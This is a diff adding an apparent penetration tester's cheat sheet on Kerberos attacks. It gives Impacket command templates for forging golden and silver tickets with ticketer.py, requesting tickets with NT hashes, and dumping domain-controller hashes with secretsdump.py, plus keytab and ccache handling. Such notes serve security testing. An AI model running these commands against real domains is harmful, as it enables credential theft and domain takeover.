@@ -1,0 +1,46 @@
+# Build ccache:
+
+ticketer.py -<aesKey|nthash> <hash> -duration <hours> -domain-sid <sid> -domain <domain name> -user-id <int user id from user sid> "<target user>
+
+Optional "-spn <spn value>" for silver ticket
+Note, spn value is of the form "<SERVICE>/<hostname>.<domain>" (note the cases, as it is case sensitive)
+
+
+# Kerberos commands:
+
+Show current ccache data:
+klist
+
+Set ccache file location:
+export KRB5CCNAME=<.ccache file location> 
+
+Delete current ccache:
+kdestroy
+
+Start a legit kerberos connection to the target domain:
+kinit
+
+Manually get silver ticket:
+kvno <full spn>@<domain>  
+Note: This will often look like SERVICE/host.coolguy.com@coolguy.com
+
+Keytab Management (haven't used this much, but could be useful in some scenarios):
+ktutil # drop into manager
+add_entry -key -p <spn> -k 1 -e RC4-HMAC # add key for account (found in secretsdump)
+<input passwd data>
+write_kt <target_file>
+q
+
+
+# Other impacket nicities:
+
+Look at ticket data
+describeTicket <ccache file>
+describeTicket --<aes|nthash> <hash> -u <user> -d <domain> <ccache file>
+
+Get ticket with impacket:
+getTGT.py -dc-ip <target dc> -<aesKey|nthash> <hash> "<domain/user>"
+Optional "-service <spn>"
+
+Try and get hashes from DC for account:
+secretsdump.py -just-dc-user "target_account" <admin user>@<target domain> 
